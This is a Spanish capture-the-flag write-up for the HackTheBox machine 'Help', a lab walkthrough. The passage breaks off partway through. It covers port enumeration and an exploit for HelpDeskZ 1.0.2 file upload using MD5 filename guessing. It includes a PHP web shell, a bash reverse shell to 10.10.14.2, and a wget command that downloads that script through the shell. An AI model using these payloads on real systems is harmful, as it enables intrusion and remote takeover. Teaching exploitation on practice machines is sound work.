@@ -1,0 +1,1492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Help</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Help | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Help" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil. Investigaremos subidas de archivos .php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotación de un kernel con ganas de morir." />
+<meta property="og:description" content="Máquina Linux nivel fácil. Investigaremos subidas de archivos .php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotación de un kernel con ganas de morir." />
+<link rel="canonical" href="http://localhost:4000/htb/help" />
+<meta property="og:url" content="http://localhost:4000/htb/help" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-22T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png" />
+<meta property="twitter:title" content="HackTheBox - Help" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-22T00:00:00-07:00","datePublished":"2021-07-22T00:00:00-07:00","description":"Máquina Linux nivel fácil. Investigaremos subidas de archivos .php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotación de un kernel con ganas de morir.","headline":"HackTheBox - Help","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/help"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/help"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Help</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-22">22 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png" alt="HackTheBox - Help">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil. Investigaremos subidas de archivos <strong>.php</strong> en el servicio <strong>HelpDeskZ</strong>, jueguitos sucios con <strong>MySQL</strong> y una explotación de un kernel con ganas de morir.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170helpHTB.png" alt="170helpHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/3079">cymtrick</a>.</p>
+
+<p>A tope con vulnerabilidades conocidas…</p>
+
+<p>Nos encontraremos una web por default ofrecida por <strong>Apache</strong>, profundizando en ella encontraremos un servicio llamado <code>HelpDeskZ</code>, volviendo a profundizar encontraremos una vulnerabilidad para explotar una subida de archivos (muy loca, pero interesantísima), jugaremos con ella para subir un archivo <code>.php</code> y lograr ejecutar comandos en el sistema, finalmente conseguiremos ejecutar una <strong>reverse Shell</strong> como el usuario <strong>help</strong>.</p>
+
+<p>Estando en el sistema (no sé si es necesario para la máquina, pero lo hicimos) encontramos unas credenciales por medio de <code>MySQL</code>, serán válidas para obtener una sesión <code>SSH</code> como <strong>help</strong>.</p>
+
+<p>Enumerando lo que tenemos a la mano, nos fijaremos cuidadosamente en la versión del kernel, si buscamos cositas relacionadas con ella llegaremos a un exploit, ¿qué hace? Pues explotar el kernel 🙃 e.e Si la explotación es exitosa nos devolvería una <strong>Shell</strong> como el usuario <strong>root</strong>, jugaremos con ella para lograrlo.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Bastante R34LG4LIFE, lo cual ta buenisimooooooooooooooooo.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Buenas noches, siga, tome asiento por favor.</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+      <li><a href="#puerto-80">Enumeramos el servidor web (puerto 80)</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación, exploramos el servicio de tickets <strong>HelpDeskZ</strong></a>.
+    <ul>
+      <li><a href="#exp-helpdeskz-rce">Obtenemos ejecucion remota de comandos con un archivo <u>.php</u> como adjunto en un <strong>ticket</strong></a>.</li>
+    </ul>
+    <ul>
+      <li><a href="#code-review-php">— Leemos el código de la web para entender por qué podemos subir archivos <strong>.php</strong> aunque la web mostrara que no era un formato válido</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#dump-mysql2ssh">Conseguimos credenciales para obtener una Shell con <strong>SSH</strong></a>.
+    <ul>
+      <li><a href="#dump-db-mysql">Empezamos a dumpear la base de datos <u>support</u></a>.</li>
+      <li><a href="#dump-db-mysql-staff">Seguimos dumpeando y encontramos credenciales</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<hr />
+
+<h3 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">🔗</a></h3>
+
+<p>Empezaremos enumerando que puertos están abiertos en la máquina, esto lo haremos con la ayuda de <strong>nmap</strong>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.121 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Nos responde con:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Wed Jul 21 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.121
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.121 ()	Status: Up
+Host: 10.10.10.121 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3000/open/tcp//ppp///
+# Nmap done at Wed Jul 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 90.73 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong>: Tenemos la posibilidad de obtener una Shell de manera segura.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Nos ofrece un servidor web.</td>
+    </tr>
+    <tr>
+      <td>3000</td>
+      <td style="text-align: left">No sabemos que será <strong>PPP</strong>, veamos si con el siguiente escaneo logramos profundizar.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora que tenemos los puertos activos que maneja la máquina haremos otro escaneo, esta vez para ver que versiones y scripts relacionan a cada servicio encontrado:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.121
+    [*] Open ports: 22,80,3000
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80,3000 -sC -sV 10.10.10.121 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Wed Jul 21 25:25:25 2021 as: nmap -p 22,80,3000 -sC -sV -oN portScan 10.10.10.121
+Nmap scan report for 10.10.10.121
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jul 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 25.82 seconds
+</code></pre>
+
+<p>Tenemos algunas cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.2p2 Ubuntu 4ubuntu2.6</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.18</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3000</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Node.js Express</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Bien, nada llamativo, pero sabemos que el puerto <strong>3000</strong> sostiene un servidor con <strong>node</strong>, tamos bien… Por ahora nada más, profundicemos a keeeeeeee!</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">🔗</a></h3>
+
+<p>Si nos fijamos en nuestro escaneo de versiones, vemos que el puerto <strong>80</strong> sostiene la página por default ofrecida por <strong>Apache</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_apacheDefault.png" alt="170page80_apacheDefault" /></p>
+
+<p>Claramente nada interesante, jugando en internet con la versión de <strong>Apache</strong> tampoco vemos nada, intentemos ver si existen directorios fuera de nuestra vista:</p>
+
+<pre><code class="language-bash">❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.121/FUZZ
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000024:   403        11 L     32 W       296 Ch      ".htaccess"
+000000023:   403        11 L     32 W       291 Ch      ".hta"
+000000025:   403        11 L     32 W       296 Ch      ".htpasswd"
+000002180:   200        375 L    968 W      11321 Ch    "index.html"
+000002305:   301        9 L      28 W       317 Ch      "javascript"
+000003694:   403        11 L     32 W       300 Ch      "server-status"
+000004001:   301        9 L      28 W       314 Ch      "support"
+...
+</code></pre>
+
+<p>Opa, encontramos 2 directorios llamativos, <code>javascript</code> y <code>support</code>, si exploramos <code>javascript</code> nos indica que no tenemos permisos para ver su contenido; peeeeeeero si intentamos con <code>support</code> caemos acá:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support.png" alt="170page80_support" /></p>
+
+<p>😯 Un servicio llamado <a href="https://www.helpdeskz.com/">HelpDeskZ</a> que nos permite darle a nuestro sitio un apartado de soporte mediante <strong>tickets</strong>, interesante, sigamos viendo…</p>
+
+<p>Hay un apartado <code>/login</code>, pero probando credenciales por default no logramos pasarlo, intentamos algunos payloads de inyecciones conocidas pero tampoco. Jugando con los demás ítems vemos uno para enviar nuestro ticket:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_formTickets.png" alt="170page80_support_formTickets" /></p>
+
+<p>Tenemos un formulario para detallar el problema, vemos un campo en el que podemos agregar un archivo, generemos uno para probar si podemos subir objetos <code>.php</code>:</p>
+
+<pre><code class="language-bash">❱ cat holiwis.php
+&lt;?php system("id"); ?&gt;
+</code></pre>
+
+<p>El archivo en caso de ser interpretado por alguna web nos deberia devolver el resultado del comando <code>id</code>, intentemos enviar el formulario pero ahora agregando el archivo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_formTickets_file.png" alt="170page80_support_formTickets_file" /></p>
+
+<p>Le pasamos el <strong>captcha</strong> y damos clic en <code>Submit</code>.</p>
+
+<p>La web nos responde:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_fileNotAllowed.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Así que al parecer no podemos subir archivos <code>.php</code>, podriamos intentar cambiar el contenido agregando <code>GIF8;</code> al inicio del objeto para que el sistema y la web interpreten que el contenido es un <code>gif</code>, pero realmente es codigo <code>.php</code>. Peero esto no nos funciona, si jugamos con la extension tampoco llegamos a ningun lado, así que sigamos enumerando la web…</p>
+
+<p>Podemos ver que recursos esta sosteniendo <code>/support</code> con ayuda de nuevo de <code>wfuzz</code>:</p>
+
+<pre><code class="language-bash">❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.121/support/FUZZ
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload      
+=====================================================================
+
+000000015:   200        17 L     42 W       378 Ch      ".gitattributes"
+000000025:   403        11 L     32 W       304 Ch      ".htpasswd"
+000000024:   403        11 L     32 W       304 Ch      ".htaccess"
+000000023:   403        11 L     32 W       299 Ch      ".hta"
+000001243:   301        9 L      28 W       326 Ch      "controllers"
+000001316:   301        9 L      28 W       318 Ch      "css"
+000001748:   200        3 L      23 W       1144 Ch     "favicon.ico"
+000002153:   301        9 L      28 W       321 Ch      "images"
+000002174:   301        9 L      28 W       323 Ch      "includes"
+000002181:   200        96 L     236 W      4453 Ch     "index.php"
+000002337:   301        9 L      28 W       317 Ch      "js"
+000004296:   301        9 L      28 W       322 Ch      "uploads"
+000004387:   301        9 L      28 W       320 Ch      "views"
+...
+</code></pre>
+
+<p>Bueno, varias cositas, las interesantes o llamativas son:</p>
+
+<ul>
+  <li><code>.gitattributes</code></li>
+  <li><code>uploads</code></li>
+  <li><code>views</code></li>
+</ul>
+
+<p>El único que nos da contenido es <code>.gitattributes</code>, pero nada relevante para seguirlo. Los demás recursos nos envían de vuelta a la página por default de <strong>Apache</strong>, o sea, hace un redirect…</p>
+
+<p>Jugando con cada uno de ellos para ver si existían recursos dentro, encontramos que al parecer <code>uploads</code> guarda los tickets que subimos, ya sea tooodo el ticket o los adjuntos:</p>
+
+<pre><code class="language-bash">❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.121/support/uploads/FUZZ
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload 
+=====================================================================
+
+000000023:   403        11 L     32 W       307 Ch      ".hta"
+000000025:   403        11 L     32 W       312 Ch      ".htpasswd"
+000000024:   403        11 L     32 W       312 Ch      ".htaccess"
+000000693:   301        9 L      28 W       331 Ch      "articles"
+000002181:   302        0 L      0 W        0 Ch        "index.php"
+000004137:   301        9 L      28 W       330 Ch      "tickets"
+...
+</code></pre>
+
+<p>Pero si intentamos direccionarnos hacia <code>tickets</code> nos redirecciona a la pantalla por default :( y si seguimos intentando profundizar en su contenido no encontramos nada más.</p>
+
+<p>Intentando subir archivos y despues buscarlos en la ruta <code>/support/uploads/tickets</code> no encontramos nada ):</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Buscando vulnerabilidades relacionadas con <code>HelpDeskZ</code> encontramos dos principalmente, pero solo uno que no necesita credenciales para funcionar:</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/40300"><strong>HelpDeskZ 1.0.2</strong> - Arbitrary File Upload</a>.</li>
+</ul>
+
+<p>Viendo el código y lo que hace (en el propio código explica la explotación) el creador nos explica algo interesante:</p>
+
+<blockquote>
+  <p>“The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file.”
+“So by guessing the time the file was uploaded, we can get RCE”</p>
+</blockquote>
+
+<p>Pero leyendo atentamente recordamos que a nosotros no nos deja subir archivos <code>.php</code>, o sea que quizás estamos en una versión más adelante a la que explota este exploit…</p>
+
+<p>Peeeeeeeeeeeeeeeeeeeeeeeeero este exploit me hizo dar una idea de como trabajan los administradores de <code>HelpDeskZ</code> y que quizás nuestra versión:</p>
+
+<ul>
+  <li>También tome los nombres de los archivos y los “ofusque” en <strong>md5</strong>, pero que al final le agregue la extensión real del archivo.</li>
+</ul>
+
+<p>La cosa es que necesitaríamos poder subir un archivo <code>.php</code> o con contenido <code>.php</code> que sea interpretado.</p>
+
+<p>…</p>
+
+<p>No fue necesario empezar a profundizar porque el siguiente link que había abierto nos iluminaba (muy en la cara, <strong>lo cual ta feo</strong>) con que hacer:</p>
+
+<ul>
+  <li><a href="https://wikihak.com/how-to-upload-a-shell-in-helpdeskz-v1-0-2/">How to upload a shell in HelpdeskZ v1.0.2</a>.</li>
+</ul>
+
+<p>En él hace exactamente lo mismo, cambia pequeñísimos detalles pero es igual. Lo único que cambia es que nos indica esto:</p>
+
+<blockquote>
+  <p>Submit New ticket and upload the shell: <span style="color: yellow;"><strong>Ignore</strong> the <u>file not allowed warning</u><span></span></span></p>
+</blockquote>
+
+<p>Oooooh, al parecer en su <strong>PoC</strong> le da igual que salga el mensaje que no puede subir X tipo de archivo y aun así la explota, esto nos da la mano para pensar que podemos intentar lo mismo. El artículo nos brinda un código para explotar la máquina:</p>
+
+<h3 id="reading-exp-helpdeskz">Entendiendo un poco que hace el exploit <a href="#reading-exp-helpdeskz">🔗</a></h3>
+
+<hr />
+
+<pre><code class="language-py">import hashlib
+import time
+import sys
+import requests
+import calendar
+
+helpdeskzBaseUrl = "http://10.10.10.121/support/uploads/tickets/" # change this
+fileName = "reverse_shell.php" # Your reverse shell
+
+response = requests.head('http://10.10.10.121') # Change this
+serverTime=response.headers['Date'] # getting the server time
+timeFormat="%a, %d %b %Y %H:%M:%S %Z"
+currentTime = int(calendar.timegm(time.strptime(serverTime,timeFormat)))
+
+for x in range(0, 800):
+   plaintext = fileName + str(currentTime - x)
+   md5hash = hashlib.md5(plaintext.encode()).hexdigest()
+   url = helpdeskzBaseUrl+md5hash+'.php'
+   print(url)
+
+   response = requests.head(url)
+   if response.status_code == 200:
+      print("found!")
+      sys.exit(0)
+
+print("Sorry, I did not find anything")
+</code></pre>
+
+<p>En el nos <strong>spoilea</strong> que exploto ESTA máquina (la máquina <code>help</code>, por si no se entiende :P), así que por un lado estamos felices porque encontramos algo, <strong>pero sabemos que ese algo nos va a funcionar si o si :l</strong></p>
+
+<p>Hablemos de que hace este y el anterior exploit rápidamente:</p>
+
+<ol>
+  <li>Extrae la fecha en la que hacemos la ejecución del programa (en la que hace la conexión con la web, pero como es tan rápido, prácticamente es el momento en que ejecutamos el script).</li>
+  <li>La pasa a formato <a href="https://docs.python.org/3/library/calendar.html#calendar.timegm">timegm</a>: O sea, la fecha a <strong>timestamp value</strong>.</li>
+  <li>Y hace <strong>800</strong> peticiones (da igual el número, pueden ser 10, esto siempre y cuando se suba el archivo y de una se ejecute el exploit) para:
+    <ul>
+      <li>Tomar la fecha actual de ejecucion e irle restando <code>1,2,3,4,...,800</code>. Concatena el nombre original del archivo a esa resta.</li>
+      <li>Encripta el valor de <code>nombrearchivoTIMESTAMP</code> en formato <strong>MD5</strong>.</li>
+      <li>Y al final le agrega la extensión <code>.php</code></li>
+      <li><strong>Si en algún momento de las 800 peticiones encuentra que en X periodo de tiempo se subió Y archivo, nos mostrara la URL asociada.</strong></li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h3 id="exp-helpdeskz-rce">Obtenemos RCE con un archivo <u>.php</u> <a href="#exp-helpdeskz-rce">🔗</a></h3>
+
+<p>Perfecto, pues cambiémoslo para que quede con nuestra data:</p>
+
+<pre><code class="language-py">...
+fileName = "holiwis.php"
+...
+</code></pre>
+
+<p>Ahora, creamos de nuevo un ticket, adjuntamos el archivo <code>holiwis.php</code>, vemos que nos responda <code>File is not allowed</code> y ejecutamos el exploit para ver si encuentra el archivo:</p>
+
+<pre><code class="language-bash">❱ python3 tryRCE.py
+...
+http://10.10.10.121/support/uploads/tickets/e536560d711ec6b799cdd6bff5df7ff1.php
+http://10.10.10.121/support/uploads/tickets/7f809bc1c8849caf3158f4cfae9b4d84.php
+http://10.10.10.121/support/uploads/tickets/b312527ca778b642e03ee24e44918aeb.php
+http://10.10.10.121/support/uploads/tickets/d54ee70b5314543bb595b6690dfd9a91.php
+http://10.10.10.121/support/uploads/tickets/21cdbb35831b91f5f551d79e0e5bad58.php
+found!
+</code></pre>
+
+<p>OPAAA, pues visitemos ese link:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_foundTicketRCE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>EJEEEEEEEEEEEE, tenemos ejecución remota de comandooooooooooooooooooooooos!!</p>
+
+<p>Ahora generemos un archivo que nos permita ejecutar cualquier comando que le pasemos por una variable <strong>GET</strong>:</p>
+
+<pre><code class="language-bash">❱ cat holiwis.php 
+&lt;?php system($_GET['xmd']); ?&gt;
+</code></pre>
+
+<p>Entonces, le pasaremos nuestro comando a través de la variable <code>xmd</code> y esta será interpretada por la función <code>system</code>, generemos el ticket y busquemos el archivo:</p>
+
+<pre><code class="language-bash">❱ python3 tryRCE.py 
+http://10.10.10.121/support/uploads/tickets/8ea50935d73ed6f424a8a79adfb34de0.php
+http://10.10.10.121/support/uploads/tickets/240236ef9c7351d8334a14df56870917.php
+http://10.10.10.121/support/uploads/tickets/ee130b3f3dc98c3e9a71682e0bece6cb.php
+http://10.10.10.121/support/uploads/tickets/22d8b499c06c57f6728ead123c0fede8.php
+http://10.10.10.121/support/uploads/tickets/a21b24a794cf5736c769a2f19e42e6f9.php
+http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php
+found!
+</code></pre>
+
+<p>Validamos:</p>
+
+<pre><code class="language-bash">❱ curl http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=hostname
+help
+</code></pre>
+
+<pre><code class="language-bash">❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=hostname;id" 
+help
+uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
+</code></pre>
+
+<p>Perfectooo, ahora si tenemos control con respecto a que comando ejecutamos, generemos una reverse Shell:</p>
+
+<p>Intentando con <code>bash -i &gt;&amp; ...</code> no logramos ejecutarlo directamente, también vemos que <code>cURL</code> no existe como binario (<code>which+curl</code>), peeeero si existe <code>wget</code>:</p>
+
+<blockquote>
+  <p>Tendremos que agregar los <code>+</code> para que los tome como espacios si es que ejecutamos todo desde la <code>bash</code>.</p>
+</blockquote>
+
+<pre><code class="language-bash">❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=which+wget" 
+/usr/bin/wget
+</code></pre>
+
+<p>Así que podemos probar a subir un archivo al sistema con código <code>bash</code> y posteriormente ejecutarlo:</p>
+
+<pre><code class="language-bash">❱ cat rere.sh 
+#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.14.2/4433 0&gt;&amp;1
+</code></pre>
+
+<p>Levantamos un servidor web con <strong>Python</strong>:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<p>Subimos archivo <code>.sh</code> con <strong>wget</strong> al directorio <code>/tmp</code>:</p>
+
+<pre><code class="language-bash"># wget http://10.10.14.2:8000/rere.sh -O /tmp/rere.sh
+❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=wget+http://10.10.14.2:8000/rere.sh+-O+/tmp/rere.sh" 
+</code></pre>
+
+<p>Validamos que exista:</p>
+
+<pre><code class="language-bash"># ls -la /tmp/rere.sh
